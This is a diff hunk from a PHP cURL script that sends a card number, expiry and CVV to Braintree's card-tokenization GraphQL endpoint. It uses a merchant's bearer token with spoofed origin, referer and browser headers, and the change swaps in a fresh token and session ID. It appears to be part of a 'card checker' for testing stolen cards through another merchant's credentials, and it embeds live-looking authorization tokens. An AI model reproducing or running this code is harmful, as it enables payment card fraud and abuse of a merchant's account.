@@ -204,14 +204,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE2MDQ2ODQsImp0aSI6IjExMTBjMzdhLTY3OWItNGE1ZC05YjcxLTM2YzI5MmRlNjA0YiIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.wuqM36n0GWL3rek_7D10wkk0VLPGWnmqXi1Xx3olIm0C-Mi67qnMyDdqTx7-l03NY5DFYMO5PNyEqJsI6HZh6A',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE2MzU3MjMsImp0aSI6IjY5ZDM1YTkyLTNhZTYtNGE4Yy1iYmMyLTEwNzU0Zjc0MGI5YyIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.mq_-_vVjMz-gWe2qtq-2TPsbTN46rcFV7noYzrp8a4oKt00zRw6ZnwAB6x120xiWqSGltKgXavjXL_8pOoPo4w',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
 'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"41e63a0b-f9c5-40d3-a8b4-11fcbb46940c"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"360414b9-d674-4e95-8fd0-5fdf9074b294"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 $b_pago = curl_exec($ch);
 
